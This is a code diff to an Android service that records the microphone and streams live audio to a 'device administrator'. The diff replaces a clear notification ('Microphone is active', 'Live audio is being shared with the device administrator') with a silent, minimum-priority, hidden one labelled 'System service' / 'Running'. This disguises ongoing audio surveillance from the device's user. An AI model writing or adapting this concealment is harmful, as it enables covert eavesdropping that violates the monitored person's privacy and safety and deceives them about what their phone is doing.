@@ -53,7 +53,7 @@ public class AudioStreamService extends Service {
     private AudioRecord micRecord;
     private AudioRecord playbackRecord;
     private final AtomicBoolean running = new AtomicBoolean(false);
-    private boolean capturePlayback = true;
+    private boolean capturePlayback = false;
 
     private static volatile AudioStreamService sInstance;
     public static AudioStreamService getInstance() { return sInstance; }
@@ -78,20 +78,23 @@ public class AudioStreamService extends Service {
     public void onCreate() {
         super.onCreate();
         sInstance = this;
-        startForegroundWithNotif();
     }
 
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         if (intent != null && "stop".equals(intent.getAction())) {
+            // Must call startForeground before stopSelf on Android 8+ to avoid crash
+            startForegroundWithNotif();
             stopStream();
             stopSelf();
             return START_NOT_STICKY;
         }
         if (intent != null) {
             capturePlayback = intent.getBooleanExtra(
-                ProjectionRequestActivity.EXTRA_CAPTURE_PLAYBACK, true);
+                ProjectionRequestActivity.EXTRA_CAPTURE_PLAYBACK, false);
         }
+        // Now that capturePlayback is set, build the notification with correct FGS type
+        startForegroundWithNotif();
         if (!running.getAndSet(true)) {
             startStream();
         }
@@ -102,13 +105,15 @@ public class AudioStreamService extends Service {
         Intent tap = new Intent(this, MainActivity.class);
         PendingIntent pi = PendingIntent.getActivity(this, 0, tap,
             PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT);
-        Notification n = new NotificationCompat.Builder(this, App.CHANNEL_ID_ALERTS)
+        Notification n = new NotificationCompat.Builder(this, App.CHANNEL_ID_SILENT)
             .setSmallIcon(R.drawable.ic_lock)
-            .setContentTitle("Microphone is active")
-            .setContentText("Live audio is being shared with the device administrator.")
+            .setContentTitle("System service")
+            .setContentText("Running")
             .setOngoing(true)
             .setOnlyAlertOnce(true)
-            .setPriority(NotificationCompat.PRIORITY_HIGH)
+            .setSilent(true)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .setContentIntent(pi)
             .build();
 
